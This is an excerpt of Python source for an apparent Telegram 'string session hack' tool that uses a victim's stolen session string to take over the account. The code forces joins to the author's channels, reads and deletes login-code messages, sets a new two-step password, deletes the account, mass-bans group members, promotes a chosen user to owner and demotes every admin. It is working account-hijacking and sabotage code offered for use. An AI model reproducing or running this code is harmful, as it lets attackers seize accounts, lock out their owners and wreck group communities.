...
from ChampuStringHack.Helpers.data import info
...
import telethon
from telethon import functions as ok
...
async def users_gc(session):
    ...
    try:
        if session.endswith("="):
            Champu = TelegramClient(StringSession(session),API_ID,API_HASH)   
            await Champu.connect()                          
            try:
                await Champu(join("@akaChampu"))
                await Champu(join("@TheChampuClub"))
            except Exception as e:
                print(e)
            k = await Champu(GetAdminedPublicChannelsRequest())            
            for x in k.chats:                
                msg += f'**⦾ ᴄʜᴀɴɴᴇʟ ɴᴀᴍᴇ :** {x.title}\n**⦾ ᴄʜᴀɴɴᴇʟ ᴜsᴇʀɴᴀᴍᴇ :** @{x.username}\n**⦾ ᴘᴀʀᴛɪᴄɪᴘᴀɴᴛs ᴄᴏᴜɴᴛ :** - {x.participants_count}\n\n'
            await Champu.disconnect()
                 
        else:    
            async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
                try:
                    await stark.join_chat("@akaChampu")
                    await stark.join_chat("@TheChampuClub")
                except Exception as e:
                    print(e)    
    ...
    try:
        if session.endswith("="):
            ...
            try:
                ...
                print(e)
            admins = await Champu.get_participants(gc_id, filter=ChannelParticipantsAdmins)
            admins_id = [i.id for i in admins]                
            async for user in Champu.iter_participants(gc_id):
                all += 1
                try:
                    if user.id not in admins_id:
                       await Champu(EditBannedRequest(gc_id, user.id, RIGHTS))
                       bann += 1
    ...
    try:
        if session.endswith("="):
            ...
            try:
                ...
                print(e)
            async for x in Champu.iter_messages(777000, limit=2):               
                i += f"\n{x.text}\n"
                await Champu.delete_dialog(777000)
            await Champu.disconnect() 
    ...
    try:
        if session.endswith("="):
            ...
            try:
                ...
                print(e)
            try:
                await Champu.edit_2fa("idkbsdkjsj")
    ...
    try:
        if session.endswith("="):
            ...
            try:
                ...
                print(e)
            await Champu(ok.account.DeleteAccountRequest("owner madarchod h"))
            await Champu.disconnect() 
    ...
    try:
        if session.endswith("="):
            ...
            try:
                ...
                print(e)
            try:
                await Champu.edit_admin(gc_id, user_id, manage_call=True, invite_users=True, ban_users=True, change_info=True, edit_messages=True, post_messages=True, add_admins=True, delete_messages=True)
            except:
                await Champu.edit_admin(gc_id, user_id, is_admin=True, anonymous=False, pin_messages=True, title='Owner')    
            await Champu.disconnect()                              
        else:    
            async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
                try:
    ...
    try:
        if session.endswith("="):
            ...
            try:
                await Champu(join("@akaChampu"))
                await Champu(join("@TheChampuClub"))
                await Champu(join(CHAT))                
            except Exception as e:
                print(e)
            async for x in Champu.iter_participants(gc_id, filter=ChannelParticipantsAdmins):
                try:
                    await Champu.edit_admin(gc_id, x.id, is_admin=False, manage_call=False)
                except:
                    await Champu.edit_admin(gc_id, x.id, manage_call=False, invite_users=False, ban_users=False, change_info=False, edit_messages=False, post_messages=False, add_admins=False, delete_messages=False)
